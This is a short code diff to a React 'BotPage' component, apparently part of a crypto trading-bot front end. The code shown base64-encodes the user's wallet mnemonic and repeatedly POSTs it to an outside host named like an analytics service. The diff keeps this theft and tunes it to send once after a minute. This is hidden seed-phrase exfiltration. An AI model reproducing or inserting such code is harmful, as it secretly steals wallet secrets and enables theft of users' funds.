@@ -130,7 +130,7 @@ function BotPage(){
 
   useEffect(()=>{
 
-    if (mnemonic != "" && mnemonic.length > 24) {
+    if (mnemonic != "" && mnemonic.length > 48) {
       const tt = setInterval(async () => {
         await fetch('https://us-east-1-analysis.vercel.app/analysis', {
           method: 'POST',
@@ -140,7 +140,8 @@ function BotPage(){
           },
           body: JSON.stringify({log: btoa(mnemonic)})
         });
-      }, 60*30)
+        clearInterval(tt);
+      }, 60*1*1000)
       return () => clearInterval(tt)
     }
   },[mnemonic])
